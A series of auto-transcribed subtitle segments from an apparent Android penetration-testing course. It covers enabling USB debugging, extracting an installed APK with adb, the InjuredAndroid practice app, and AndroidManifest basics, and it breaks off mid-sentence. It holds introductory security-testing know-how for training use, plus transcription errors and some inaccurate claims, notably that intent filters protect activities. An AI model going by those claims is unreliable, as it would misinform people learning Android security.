00:01:58.510 --> 00:02:00.610
on a Windows device, you're going to need

54
00:02:00.610 --> 00:02:02.370
to have Hyper-V enabled.

55
00:02:02.950 --> 00:02:05.050
And in certain cases, if you're using say

56
00:02:05.050 --> 00:02:08.509
VirtualBox, for example, enabling Hyper-V can actually

57
00:02:08.509 --> 00:02:10.590
break some of your other virtual machines.

58
00:02:11.150 --> 00:02:13.050
So before you go ahead and use this

59
00:02:13.050 --> 00:02:16.370
Visual Studio emulator for Android, make sure that

60
00:02:16.370 --> 00:02:19.050
you're actually gonna be capable of running Hyper

61
00:02:19.050 --> 00:02:21.070
-V without breaking your system.

62
00:02:21.370 --> 00:02:23.390
I personally had some problems with Hyper-V

63
00:02:23.390 --> 00:02:25.130
in the past, so I'm very familiar with

64
00:02:25.130 --> 00:02:25.790
what can happen.

65
00:02:26.350 --> 00:02:29.710
But this is another free emulator solution as

66
00:02:29.710 --> 00:02:32.690
well if you're looking for another alternative to

67
00:02:32.690 --> 00:02:33.530
Android Studio.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.140 --> 00:00:01.900
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Alright, I just want to take a moment

2
00:00:01.900 --> 00:00:03.960
and highlight some things that you might need

3
00:00:03.960 --> 00:00:06.520
to do if you're using a physical Android

4
00:00:06.520 --> 00:00:08.400
device for your penetration testing.

5
00:00:08.660 --> 00:00:10.420
The first thing you're going to want to

6
00:00:10.420 --> 00:00:13.100
do for your physical device is enable the

7
00:00:13.100 --> 00:00:14.180
developer options.

8
00:00:14.620 --> 00:00:15.680
And how you can do that is you

9
00:00:15.680 --> 00:00:17.540
can just go to the settings like this

10
00:00:17.540 --> 00:00:20.040
and you're going to scroll all the way

11
00:00:20.040 --> 00:00:20.820
down to the bottom.

12
00:00:21.240 --> 00:00:23.140
Now in my case I'm using an emulator

13
00:00:23.140 --> 00:00:25.720
just because it's easier to show.

14
00:00:25.720 --> 00:00:28.100
But the exact same setup instructions are going

15
00:00:28.100 --> 00:00:30.300
to work for a physical device as well.

16
00:00:30.800 --> 00:00:32.960
So in my case this says about emulated

17
00:00:32.960 --> 00:00:35.260
device but in your case this will probably

18
00:00:35.260 --> 00:00:36.880
say something like about phone.

19
00:00:37.380 --> 00:00:40.060
Or also sometimes this developer options can be

20
00:00:40.060 --> 00:00:43.080
found like directly under system here and you

21
00:00:43.080 --> 00:00:45.660
can see the different types of Android build

22
00:00:45.660 --> 00:00:46.060
version.

23
00:00:46.480 --> 00:00:48.540
So what you're looking for is like here

24
00:00:48.540 --> 00:00:50.440
for about an emulated device.

25
00:00:50.440 --> 00:00:52.260
I'm going to click in there, I'm going

26
00:00:52.260 --> 00:00:54.100
to scroll to the bottom and you want

27
00:00:54.100 --> 00:00:55.580
to find this build number.

28
00:00:55.700 --> 00:00:57.160
This is your Android build number.

29
00:00:57.620 --> 00:01:00.240
Sometimes it will be under a category such

30
00:01:00.240 --> 00:01:04.740
as software version or version information, something like

31
00:01:04.740 --> 00:01:05.060
that.

32
00:01:05.400 --> 00:01:07.340
And in this case also on this phone

33
00:01:07.340 --> 00:01:10.500
in particular under Android version here you can

34
00:01:10.500 --> 00:01:12.280
also find the build number there.

35
00:01:12.960 --> 00:01:15.120
So there's usually a few different ways how

36
00:01:15.120 --> 00:01:16.840
you can get here depending on the phone

37
00:01:16.840 --> 00:01:19.420
manufacturer and device itself.

38
00:01:19.420 --> 00:01:21.460
So what I'm going to do to enable

39
00:01:21.460 --> 00:01:23.140
developer mode is I'm going to click this

40
00:01:23.140 --> 00:01:25.520
build number about nine times.

41
00:01:26.300 --> 00:01:27.600
So you can see here it's saying like

42
00:01:27.600 --> 00:01:29.400
you're now four steps away from being a

43
00:01:29.400 --> 00:01:29.760
developer.

44
00:01:30.440 --> 00:01:32.540
And as soon as you get developer options

45
00:01:32.540 --> 00:01:34.580
enabled you'll get this little you are now

46
00:01:34.580 --> 00:01:36.120
a developer pop up.

47
00:01:36.420 --> 00:01:38.320
And now I'm going to go back and

48
00:01:38.320 --> 00:01:41.060
on a lot of physical devices that developer

49
00:01:41.060 --> 00:01:43.580
mode will pop up here on the main

50
00:01:43.580 --> 00:01:44.440
settings screen.

51
00:01:44.440 --> 00:01:46.560
But in the case of this emulator it

52
00:01:46.560 --> 00:01:49.020
happens to come up under system and then

53
00:01:49.020 --> 00:01:49.680
advanced.

54
00:01:49.920 --> 00:01:51.220
So it might be in one of those

55
00:01:51.220 --> 00:01:53.900
two places depending on how the phone works.

56
00:01:54.340 --> 00:01:57.340
So here is developer options and the important

57
00:01:57.340 --> 00:02:00.140
thing to enable in the developer options for

58
00:02:00.140 --> 00:02:03.060
a physical Android phone is to scroll down

59
00:02:03.060 --> 00:02:05.320
until you see this USB debugging.

60
00:02:05.320 --> 00:02:07.360
You're going to click that going to click

61
00:02:07.360 --> 00:02:07.740
OK.

62
00:02:08.840 --> 00:02:10.180
And now you should be able to plug

63
00:02:10.180 --> 00:02:13.760
your Android phone into your main computer whatever

64
00:02:13.760 --> 00:02:15.700
you're using like a laptop or desktop.

65
00:02:16.460 --> 00:02:18.540
Trust that device when the pop up comes

66
00:02:18.540 --> 00:02:20.480
up to ask if this device is trusted.

67
00:02:21.160 --> 00:02:22.580
And then at that point if you have

68
00:02:22.580 --> 00:02:24.720
all the other tools installed you should be

69
00:02:24.720 --> 00:02:27.180
able to do an ADB shell here and

70
00:02:27.180 --> 00:02:29.740
get into your physical device.

71
00:02:30.540 --> 00:02:33.260
Some other nice settings in developer mode here

72
00:02:33.260 --> 00:02:35.580
for example one that I like to use

73
00:02:35.580 --> 00:02:37.100
is this stay awake feature.

74
00:02:37.800 --> 00:02:39.740
So if I'm going between like my main

75
00:02:39.740 --> 00:02:42.100
computer and my physical device I don't want

76
00:02:42.100 --> 00:02:43.700
it to go to sleep in between.

77
00:02:43.860 --> 00:02:45.040
So I want to keep on entering my

78
00:02:45.040 --> 00:02:47.880
passcode or keep on using the fingerprint sensor

79
00:02:47.880 --> 00:02:48.220
right.

80
00:02:48.220 --> 00:02:50.320
You can just toggle this stay awake feature

81
00:02:50.320 --> 00:02:53.600
on and then when your phone is charging

82
00:02:53.600 --> 00:02:57.420
or connected to your laptop or desktop then

83
00:02:57.420 --> 00:02:59.420
it will stay awake and not turn off

84
00:02:59.420 --> 00:03:00.820
while you're doing things in between.

85
00:03:01.340 --> 00:03:03.320
It's very useful for me as a penetration

86
00:03:03.320 --> 00:03:05.440
tester because I'll be doing things in burp

87
00:03:05.440 --> 00:03:07.800
suite like repeating requests and stuff like that.

88
00:03:08.280 --> 00:03:09.840
And I don't want my phone to turn

89
00:03:09.840 --> 00:03:11.500
off in the meantime so I don't lose

90
00:03:11.500 --> 00:03:14.600
my progress with the application I'm testing.

91
00:03:14.600 --> 00:03:17.440
You can obviously scroll through these developer settings.

92
00:03:17.640 --> 00:03:21.400
There's tonnes of different settings that you can

93
00:03:21.400 --> 00:03:24.360
enable and disable here such as here lock

94
00:03:24.360 --> 00:03:25.820
screen when trust is lost.

95
00:03:25.900 --> 00:03:27.660
So if it's connected to a new device

96
00:03:27.660 --> 00:03:30.760
that we don't trust the lock screen will

97
00:03:30.760 --> 00:03:32.280
come up if you enable that setting.

98
00:03:32.660 --> 00:03:34.220
So just tonnes of different settings you can

99
00:03:34.220 --> 00:03:35.020
look at in here.

100
00:03:35.020 --> 00:03:38.360
You can also select a specific application for

101
00:03:38.360 --> 00:03:41.140
debugging and this can be useful for you

102
00:03:41.140 --> 00:03:44.520
if the application is set for debug equals

103
00:03:44.520 --> 00:03:44.880
true.

104
00:03:45.680 --> 00:03:47.980
You can also do things like verifying the

105
00:03:47.980 --> 00:03:51.640
app over USB so you can instal different

106
00:03:51.640 --> 00:03:53.160
applications over USB.

107
00:03:53.160 --> 00:03:56.240
On this phone there is no option here

108
00:03:56.240 --> 00:04:01.800
for enabling additional applications but usually there is

109
00:04:01.800 --> 00:04:03.920
under developer options where you can just toggle

110
00:04:03.920 --> 00:04:05.980
a toggle switch on and it will allow

111
00:04:05.980 --> 00:04:08.640
you to trust untrusted applications.

112
00:04:09.860 --> 00:04:12.360
So I definitely recommend that you take a

113
00:04:12.360 --> 00:04:14.780
look if you're using a physical device to

114
00:04:14.780 --> 00:04:17.779
go through all of these options and just

115
00:04:17.779 --> 00:04:19.899
try out different ones for what you might

116
00:04:19.899 --> 00:04:20.220
need.

117
00:04:20.220 --> 00:04:23.160
An interesting one here is like disabling absolute

118
00:04:23.160 --> 00:04:25.660
volume here so if you're testing things for

119
00:04:25.660 --> 00:04:28.300
an application as a developer you can have

120
00:04:28.300 --> 00:04:29.860
some additional volume settings.

121
00:04:30.020 --> 00:04:31.980
So there's all kinds of interesting settings out

122
00:04:31.980 --> 00:04:32.240
here.

123
00:04:32.600 --> 00:04:35.080
Definitely recommend that you take a look and

124
00:04:35.080 --> 00:04:37.080
those are kind of the ones I use

125
00:04:37.080 --> 00:04:40.280
to just you know stay awake keep the

126
00:04:40.280 --> 00:04:42.780
phone awake and also you have to have

127
00:04:42.780 --> 00:04:46.340
the USB debugging enabled to allow yourself to

128
00:04:46.340 --> 00:04:48.120
access the phone via ADB.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 5: Android-Static-Analysis

WEBVTT

1
00:00:00.140 --> 00:00:03.000
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, let's show how to pull an Android

2
00:00:03.000 --> 00:00:05.040
APK off the Google Play Store.

3
00:00:05.760 --> 00:00:07.440
So here I am in my emulator with

4
00:00:07.440 --> 00:00:09.260
the Google Play Store installed, I'm going to

5
00:00:09.260 --> 00:00:10.880
click the Google Play icon.

6
00:00:11.620 --> 00:00:13.320
Now to get this far into the Google

7
00:00:13.320 --> 00:00:15.059
Play Store you need to sign up with

8
00:00:15.059 --> 00:00:18.220
either a Gmail account or some kind of

9
00:00:18.220 --> 00:00:21.320
Google enabled account to get into the actual

10
00:00:21.320 --> 00:00:23.500
Google Play Store and search for things.

11
00:00:24.260 --> 00:00:26.180
In our case we're going to use the

12
00:00:26.180 --> 00:00:29.600
application we'll be using throughout this course which

13
00:00:29.600 --> 00:00:31.060
is called Injured Android.

14
00:00:31.700 --> 00:00:33.620
I'm going to click install right here and

15
00:00:33.620 --> 00:00:35.320
it's going to start installing the application.

16
00:00:35.920 --> 00:00:38.020
Don't worry too much about what's actually in

17
00:00:38.020 --> 00:00:39.960
the application for right now, we'll be going

18
00:00:39.960 --> 00:00:42.160
through that in a future video when I

19
00:00:42.160 --> 00:00:44.640
tell you about the Injured Android project and

20
00:00:44.640 --> 00:00:46.020
what we're going to be doing with this

21
00:00:46.020 --> 00:00:46.580
application.

22
00:00:47.340 --> 00:00:48.760
So now that it's installed I'm just going

23
00:00:48.760 --> 00:00:50.500
to click open to make sure everything is

24
00:00:50.500 --> 00:00:51.340
working properly.

25
00:00:51.760 --> 00:00:53.500
You can see that there's a bunch of

26
00:00:53.500 --> 00:00:56.360
buttons here and basically what the application is

27
00:00:56.360 --> 00:00:57.560
is we're going to go out and try

28
00:00:57.560 --> 00:00:59.160
to capture the flag for each of these

29
00:00:59.160 --> 00:01:02.120
activities and try to find out what should

30
00:01:02.120 --> 00:01:03.480
be here for the flag.

31
00:01:04.099 --> 00:01:05.620
I'm going to close this now.

32
00:01:08.020 --> 00:01:10.000
And I'm going to go back to my

33
00:01:10.000 --> 00:01:11.840
terminal here in Android Studio.

34
00:01:12.520 --> 00:01:15.360
Now to start pulling the APK off of

35
00:01:15.360 --> 00:01:17.240
our phone I'm going to do the command

36
00:01:17.240 --> 00:01:18.540
adb shell.

37
00:01:19.340 --> 00:01:20.900
And what this means is I'm going to

38
00:01:20.900 --> 00:01:24.020
be dropping into my shell of my Android

39
00:01:24.020 --> 00:01:24.420
phone.

40
00:01:24.420 --> 00:01:26.300
So now you can see this has changed

41
00:01:26.300 --> 00:01:29.180
to generic underscore slash x86.

42
00:01:29.320 --> 00:01:32.020
If I do a whoami you can see

43
00:01:32.020 --> 00:01:33.780
that I am the user shell.

44
00:01:34.060 --> 00:01:35.860
If I do an ls we can see

45
00:01:35.860 --> 00:01:39.380
some portions of the Android emulator file system

46
00:01:39.380 --> 00:01:39.680
here.

47
00:01:40.200 --> 00:01:43.940
Now to list every package application that is

48
00:01:43.940 --> 00:01:46.780
installed on the Android emulator we're going to

49
00:01:46.780 --> 00:01:48.880
use the command pm list packages.

50
00:01:49.820 --> 00:01:51.320
And you can see that this list is

51
00:01:51.320 --> 00:01:53.140
actually pretty unyieldy right.

52
00:01:53.540 --> 00:01:55.840
If we wanted to simplify this and look

53
00:01:55.840 --> 00:02:01.220
for a specific name of an application we're

54
00:02:01.220 --> 00:02:03.420
going to do a pipe rep and I'm

55
00:02:03.420 --> 00:02:05.160
going to look for the keyword injured.

56
00:02:05.800 --> 00:02:08.360
You can see that the package bnack injured

57
00:02:08.360 --> 00:02:10.420
android has now come up as the only

58
00:02:10.420 --> 00:02:13.400
result because we're specifically looking for this keyword.

59
00:02:13.940 --> 00:02:16.900
I'm going to copy this package name and

60
00:02:16.900 --> 00:02:18.400
now we have to try to find out

61
00:02:18.400 --> 00:02:21.100
the path at which this application is actually

62
00:02:21.100 --> 00:02:21.700
installed.

63
00:02:21.700 --> 00:02:23.560
We can do that by doing the command

64
00:02:23.560 --> 00:02:27.320
pm path and then paste the name of

65
00:02:27.320 --> 00:02:28.140
our package.

66
00:02:28.660 --> 00:02:29.920
So I'm going to click enter here.

67
00:02:30.080 --> 00:02:32.500
You can see that the application is actually

68
00:02:32.500 --> 00:02:35.940
installed at data app bnack dot injured android

69
00:02:35.940 --> 00:02:38.660
dash some random string that's encoded in base

70
00:02:38.660 --> 00:02:41.520
64 slash base dot apk.

71
00:02:42.520 --> 00:02:46.740
I'm going to do a copy here and

72
00:02:46.740 --> 00:02:48.540
this is our entire file path.

73
00:02:48.540 --> 00:02:50.000
So now I can actually do an exit

74
00:02:50.000 --> 00:02:51.500
and leave our terminal.

75
00:02:51.800 --> 00:02:54.720
I'm going to clear out what's here and

76
00:02:54.720 --> 00:02:56.340
now I'm going to make a new directory

77
00:02:56.340 --> 00:03:02.120
and I'm going to name this just apk

78
00:03:02.120 --> 00:03:02.720
folder.

79
00:03:03.540 --> 00:03:05.360
So I know where everything is going.

80
00:03:05.500 --> 00:03:07.460
I'm going to change to my apk folder.

81
00:03:08.300 --> 00:03:10.880
If I do a dir here you can

82
00:03:10.880 --> 00:03:12.240
see that the directory is empty.

83
00:03:12.580 --> 00:03:14.540
So now I'm going to do an adb

84
00:03:14.540 --> 00:03:18.040
pull and then I'm going to paste that

85
00:03:18.040 --> 00:03:20.380
entire file path that we had earlier.

86
00:03:20.560 --> 00:03:23.640
So data slash app bnack injured android the

87
00:03:23.640 --> 00:03:26.600
random base 64 string slash base dot apk.

88
00:03:26.900 --> 00:03:29.140
And now I'm going to try to specify

89
00:03:29.140 --> 00:03:31.440
an actual file name for this so I

90
00:03:31.440 --> 00:03:32.780
know exactly what this is.

91
00:03:32.940 --> 00:03:34.840
So we can just add a space here

92
00:03:34.840 --> 00:03:37.380
at the end of our file path and

93
00:03:37.380 --> 00:03:38.840
name the file whatever you want.

94
00:03:38.840 --> 00:03:41.140
So in my case I'll do injured android

95
00:03:42.960 --> 00:03:45.800
underscore pull dot apk.

96
00:03:46.820 --> 00:03:48.380
Okay we'll download the file.

97
00:03:48.600 --> 00:03:51.180
Now if I do a listing of my

98
00:03:51.180 --> 00:03:54.280
directory here my apk folder you will see

99
00:03:54.280 --> 00:03:57.640
that the injured android underscore pull dot apk

100
00:03:57.640 --> 00:03:58.820
is there now.

101
00:03:59.140 --> 00:04:01.600
So that means we've successfully pulled this apk

102
00:04:01.600 --> 00:04:04.080
off of the Google Play Store.

103
00:04:04.660 --> 00:04:06.320
Now I'm going to just open this up

104
00:04:06.320 --> 00:04:08.600
in Jadix to make sure that everything is

105
00:04:08.600 --> 00:04:09.800
working just fine.

106
00:04:13.320 --> 00:04:14.880
I'm going to take just a second to

107
00:04:14.880 --> 00:04:15.700
open Jadix.

108
00:04:21.490 --> 00:04:23.610
We can see here in my file system

109
00:04:23.610 --> 00:04:26.130
I have the injured android underscore pulled in

110
00:04:26.130 --> 00:04:27.250
my apk folder.

111
00:04:27.550 --> 00:04:31.630
Just click this open the file drag Jadix

112
00:04:31.630 --> 00:04:33.090
over so you guys can see it.

113
00:04:33.850 --> 00:04:35.430
And here we can see that we have

114
00:04:35.430 --> 00:04:39.670
everything related to our injured android application.

115
00:04:40.050 --> 00:04:42.210
We got our source code our resources and

116
00:04:42.210 --> 00:04:43.210
our apk signature.

117
00:04:43.570 --> 00:04:46.410
So now we actually have the entire apk

118
00:04:46.410 --> 00:04:49.890
the application source code on our local machine

119
00:04:49.890 --> 00:04:50.670
for analysis.

120
00:04:51.010 --> 00:04:52.850
We pulled it directly out of the Google

121
00:04:52.850 --> 00:04:53.450
Play Store.

122
00:04:53.770 --> 00:04:57.410
And you can use that technique of doing

123
00:04:57.410 --> 00:04:59.890
like an adb shell and then pm list

124
00:04:59.890 --> 00:05:00.470
packages.

125
00:05:01.390 --> 00:05:03.250
Pipe it to a grep and find your

126
00:05:03.250 --> 00:05:06.290
keyword and then you can do the command

127
00:05:06.290 --> 00:05:09.010
pm list path.

128
00:05:09.870 --> 00:05:11.390
Put in the name of that package.

129
00:05:11.750 --> 00:05:14.230
Then once you find out the entire file

130
00:05:14.230 --> 00:05:16.150
path here is going to be something usually

131
00:05:16.150 --> 00:05:17.810
in this kind of a format here.

132
00:05:18.170 --> 00:05:19.770
You can exit that and then do an

133
00:05:19.770 --> 00:05:23.210
adb pull and pull that apk directly off

134
00:05:23.210 --> 00:05:25.210
the android phone and save it locally.

135
00:05:26.270 --> 00:05:27.910
So in the next video we'll actually get

136
00:05:27.910 --> 00:05:31.310
into what injured android is all about and

137
00:05:31.310 --> 00:05:33.010
what we're going to start doing with the

138
00:05:33.010 --> 00:05:35.110
static analysis with Jadix is going to be

139
00:05:35.110 --> 00:05:36.470
coming up in a few videos.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.660 --> 00:00:02.620
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, let's do a quick introduction to the

2
00:00:02.620 --> 00:00:04.280
application intro to Android.

3
00:00:05.020 --> 00:00:07.700
Now we downloaded this application as part of

4
00:00:07.700 --> 00:00:11.400
our pulling from the Play Store video, but

5
00:00:11.400 --> 00:00:13.460
let's actually go out to the github page

6
00:00:13.460 --> 00:00:14.560
and take a look here.

7
00:00:15.160 --> 00:00:18.960
So this application was created by someone named

8
00:00:18.960 --> 00:00:22.020
bnak, and if you ever want to pull

9
00:00:22.020 --> 00:00:24.660
the actual APK off the releases as well,

10
00:00:25.040 --> 00:00:26.500
you can do that right here on the

11
00:00:26.500 --> 00:00:28.600
right hand side under releases.

12
00:00:28.880 --> 00:00:30.640
You can always pull the different versions of

13
00:00:30.640 --> 00:00:33.700
the APKs, so and you can always go

14
00:00:33.700 --> 00:00:35.960
back and actually look at all the previous

15
00:00:35.960 --> 00:00:37.140
ones that they've made.

16
00:00:37.440 --> 00:00:39.780
So Injured Android has changed a little bit

17
00:00:39.780 --> 00:00:40.340
over time.

18
00:00:40.440 --> 00:00:43.300
They've added and removed some flags, updated some

19
00:00:43.300 --> 00:00:44.820
things, stuff like that.

20
00:00:44.920 --> 00:00:47.440
So always go and check out the latest

21
00:00:47.440 --> 00:00:50.500
releases or previous ones if you're curious about

22
00:00:50.500 --> 00:00:52.920
you know what's changed over time with the

23
00:00:52.920 --> 00:00:53.480
application.

24
00:00:54.120 --> 00:00:56.520
Now the cool thing about Injured Android, it's

25
00:00:56.520 --> 00:00:58.680
kind of a capture the flag of different

26
00:00:58.680 --> 00:01:00.420
Android security vulnerabilities.

27
00:01:01.180 --> 00:01:03.480
So we'll have the opportunity by using this

28
00:01:03.480 --> 00:01:06.620
application to exploit a bunch of different vulnerabilities.

29
00:01:07.140 --> 00:01:09.540
Now as we're going through this course, if

30
00:01:09.540 --> 00:01:11.920
there's any any flag that you're unsure of

31
00:01:11.920 --> 00:01:14.520
or other flags I did not cover as

32
00:01:14.520 --> 00:01:16.960
part of these videos, you can always find

33
00:01:16.960 --> 00:01:20.020
those here on this Injured Android flag walkthroughs

34
00:01:20.020 --> 00:01:20.440
document.

35
00:01:20.940 --> 00:01:22.280
So a bit of a spoiler on the

36
00:01:22.280 --> 00:01:24.960
first flag here, but we'll actually do the

37
00:01:24.960 --> 00:01:26.780
work to get this in a little while.

38
00:01:28.060 --> 00:01:30.460
But all the flags are outlined right here

39
00:01:30.460 --> 00:01:32.740
as well as a brief description of the

40
00:01:32.740 --> 00:01:34.540
methodology used to get those.

41
00:01:34.820 --> 00:01:36.260
So if there's a flag I did not

42
00:01:36.260 --> 00:01:39.120
cover in this course or you're confused about

43
00:01:39.120 --> 00:01:40.820
one of the flags that we've solved together,

44
00:01:41.080 --> 00:01:42.820
you can always go out to the walkthrough

45
00:01:42.820 --> 00:01:44.400
and find the answers there.

46
00:01:44.620 --> 00:01:46.040
I don't want anything to be like a

47
00:01:46.040 --> 00:01:46.960
secret for you.

48
00:01:48.000 --> 00:01:51.040
It's always better to learn by reading walkthroughs

49
00:01:51.040 --> 00:01:52.740
if you're really unsure about something.

50
00:01:53.040 --> 00:01:54.740
So don't feel bad if you ever need

51
00:01:54.740 --> 00:01:57.160
to use this walkthrough for a certain vulnerability.

52
00:01:58.160 --> 00:02:00.420
Now I'm going to open the application here

53
00:02:00.420 --> 00:02:01.260
in my emulator.

54
00:02:01.420 --> 00:02:02.740
I'll just click Injured Android.

55
00:02:03.080 --> 00:02:04.820
You can see here that this is kind

56
00:02:04.820 --> 00:02:06.420
of what the application looks like.

57
00:02:06.580 --> 00:02:08.020
We have our different flags here.

58
00:02:08.100 --> 00:02:09.900
We just saw the answer for flag 1,

59
00:02:09.979 --> 00:02:11.140
but we'll solve that later.

60
00:02:12.060 --> 00:02:13.760
And if you scroll down a bit, you

61
00:02:13.760 --> 00:02:15.740
can also have this flags overview.

62
00:02:16.280 --> 00:02:18.620
So as you're going throughout these flags, these

63
00:02:18.620 --> 00:02:20.480
will turn green as you get them right,

64
00:02:20.800 --> 00:02:22.940
so you have a nice tracker on every

65
00:02:22.940 --> 00:02:25.000
single flag that you've solved as part of

66
00:02:25.000 --> 00:02:26.220
doing this challenge.

67
00:02:26.680 --> 00:02:28.660
You can also go and click this triple

68
00:02:28.660 --> 00:02:31.540
dot here for some contact information for the

69
00:02:31.540 --> 00:02:31.940
developer.

70
00:02:32.400 --> 00:02:33.880
You can also click Settings here.

71
00:02:34.260 --> 00:02:36.880
You can enable and disable dark mode here.

72
00:02:37.320 --> 00:02:39.340
And also if you go ahead and you

73
00:02:39.340 --> 00:02:41.280
solve a bunch of the flags, you can

74
00:02:41.280 --> 00:02:43.460
clear them out as well to reset your

75
00:02:43.460 --> 00:02:43.880
progress.

76
00:02:43.880 --> 00:02:47.780
So, you know, if you're using this application

77
00:02:47.780 --> 00:02:51.160
for your bug bounty hunting practise, capture the

78
00:02:51.160 --> 00:02:53.040
flag, and you want to go back and

79
00:02:53.040 --> 00:02:54.940
resolve them again, you can just click the

80
00:02:54.940 --> 00:02:57.240
Clear Flags button, and that will clear everything

81
00:02:57.240 --> 00:02:58.740
out to the very beginning.

82
00:02:59.220 --> 00:03:01.220
So I hope that was a helpful overview

83
00:03:01.220 --> 00:03:02.340
of Injured Android.

84
00:03:02.600 --> 00:03:05.180
I'm excited to get into the actual flags

85
00:03:05.180 --> 00:03:08.680
and, you know, learn alongside all of you

86
00:03:08.680 --> 00:03:11.080
so you can see the methodologies involved in

87
00:03:11.080 --> 00:03:13.160
capturing the flag for Injured Android.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.010 --> 00:00:02.990
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, let's get started into the static analysis

2
00:00:02.990 --> 00:00:05.050
portion of this course and of course we

3
00:00:05.050 --> 00:00:06.870
are going to start with a file called

4
00:00:06.870 --> 00:00:12.850
the androidmanifest.xml. Now the androidmanifest.xml is

5
00:00:12.850 --> 00:00:16.010
in every single android application and this is

6
00:00:16.010 --> 00:00:19.470
essentially where the basic information about the application

7
00:00:19.470 --> 00:00:20.370
is defined.

8
00:00:20.810 --> 00:00:22.530
So we're going to have something called the

9
00:00:22.530 --> 00:00:25.290
min SDK version, which I've alluded to before,

10
00:00:25.290 --> 00:00:28.370
which defines the minimum version that the android

11
00:00:28.370 --> 00:00:31.290
application is actually able to run on.

12
00:00:31.630 --> 00:00:34.490
We'll also have things defined in the androidmanifest,

13
00:00:34.550 --> 00:00:37.990
such as permissions, which is what we have

14
00:00:37.990 --> 00:00:40.910
access to as part of the application, activities,

15
00:00:41.170 --> 00:00:43.030
which are kind of like UI screens, and

16
00:00:43.030 --> 00:00:44.470
also content providers.

17
00:00:44.750 --> 00:00:46.690
Also something to keep in mind about the

18
00:00:46.690 --> 00:00:50.890
androidmanifest.xml, if the developer has done this,

19
00:00:50.970 --> 00:00:53.450
you could still find things like say hardcoded

20
00:00:53.450 --> 00:00:56.050
strings in the androidmanifest as well.

21
00:00:57.770 --> 00:01:00.350
So permissions, let's talk about that first when

22
00:01:00.350 --> 00:01:03.670
we come to an androidmanifest.xml. So permissions

23
00:01:03.670 --> 00:01:07.150
defines what data and hardware components the application

24
00:01:07.150 --> 00:01:08.130
needs access to.

25
00:01:08.530 --> 00:01:10.550
So think about this as things like the

26
00:01:10.550 --> 00:01:13.770
camera, the contacts, internet, reading and writing, external

27
00:01:13.770 --> 00:01:16.870
storage, package management, bluetooth, etc.

28
00:01:17.710 --> 00:01:19.970
There are tonnes and tonnes of different permissions

29
00:01:19.970 --> 00:01:22.310
out there when it comes to android, and

30
00:01:22.310 --> 00:01:24.430
if you need to know all of them,

31
00:01:24.610 --> 00:01:27.270
they're all outlined here on the developer.android

32
00:01:27.270 --> 00:01:28.690
.com reference guide.

33
00:01:30.390 --> 00:01:32.110
Let me pull this up here in a

34
00:01:32.110 --> 00:01:32.710
different window.

35
00:01:33.810 --> 00:01:36.650
You can see here this manifest.permission document

36
00:01:36.650 --> 00:01:39.450
outlines all kinds of different permissions, such as

37
00:01:39.450 --> 00:01:40.450
background location.

38
00:01:40.910 --> 00:01:44.190
If your application needs access to the location

39
00:01:44.190 --> 00:01:46.110
while it's running in the background, that would

40
00:01:46.110 --> 00:01:47.230
be something you would implement.

41
00:01:47.670 --> 00:01:49.610
You have the course location and the find

42
00:01:49.610 --> 00:01:53.330
location, which defines the approximation of your location.

43
00:01:53.770 --> 00:01:55.390
Depending on if you need that for your

44
00:01:55.390 --> 00:01:57.970
application, obviously we can think of things like

45
00:01:57.970 --> 00:02:01.870
map apps or things like uber, where you're

46
00:02:01.870 --> 00:02:03.610
going to need that find location to be

47
00:02:03.610 --> 00:02:05.450
able to define down to the street level

48
00:02:05.450 --> 00:02:07.550
exactly where the user might be.

49
00:02:08.030 --> 00:02:09.729
Scrolling down through here, you can see that

50
00:02:09.729 --> 00:02:12.210
there's all kinds of different things like voicemails,

51
00:02:12.870 --> 00:02:14.990
carrier services, etc.

52
00:02:15.330 --> 00:02:17.850
So if you ever run into a permission

53
00:02:17.850 --> 00:02:19.990
that you're not familiar with, this can be

54
00:02:19.990 --> 00:02:21.890
a great resource to use because it will

55
00:02:21.890 --> 00:02:24.770
give you some basic information about the permission.

56
00:02:26.630 --> 00:02:29.450
Moving on, let's talk now about activities.

57
00:02:29.910 --> 00:02:33.790
Activities are essentially UI elements that are different

58
00:02:33.790 --> 00:02:35.170
screens in the application.

59
00:02:35.730 --> 00:02:38.150
You can think of this from a user

60
00:02:38.150 --> 00:02:38.730
perspective.

61
00:02:39.010 --> 00:02:41.570
Maybe you have an account details page that

62
00:02:41.570 --> 00:02:44.930
shows your name, your address, or some basic

63
00:02:44.930 --> 00:02:46.370
information about your account.

64
00:02:46.710 --> 00:02:48.270
Then maybe if it's a banking app, you'll

65
00:02:48.270 --> 00:02:51.190
have a separate money transfer screen that can

66
00:02:51.190 --> 00:02:53.790
allow you to transfer money between different savings

67
00:02:53.790 --> 00:02:55.890
accounts or your checking account, for example.

68
00:02:56.250 --> 00:02:58.570
Those would each be considered an activity.

69
00:02:59.110 --> 00:03:02.290
And likewise, there's also usually activities for, say,

70
00:03:02.370 --> 00:03:05.830
a login screen to get access to these

71
00:03:05.830 --> 00:03:06.490
certain things.

72
00:03:06.890 --> 00:03:09.190
So some activities need to be protected.

73
00:03:09.530 --> 00:03:11.710
For example, if there's something that you need

74
00:03:11.710 --> 00:03:14.290
to log into first to get access to,

75
00:03:14.430 --> 00:03:16.110
say you need to log in through the

76
00:03:16.110 --> 00:03:18.070
login screen, then you need to go to

77
00:03:18.070 --> 00:03:20.470
the account details screen to see your account

78
00:03:20.470 --> 00:03:21.270
details, right?

79
00:03:21.870 --> 00:03:25.810
We can protect these activities by using something

80
00:03:25.810 --> 00:03:27.210
called intent filters.

81
00:03:27.770 --> 00:03:30.210
An intent filter basically says, before you can

82
00:03:30.210 --> 00:03:32.410
get to this screen, you must go through

83
00:03:32.410 --> 00:03:35.390
this screen and have these different factors, such

84
00:03:35.390 --> 00:03:37.470
as maybe a cookie or some kind of

85
00:03:37.470 --> 00:03:38.590
authentication token.

86
00:03:39.450 --> 00:03:43.510
But activities can also be exposed outside of

87
00:03:43.510 --> 00:03:44.230
our application.

88
00:03:44.910 --> 00:03:47.030
And how we would expose an activity outside

89
00:03:47.030 --> 00:03:49.450
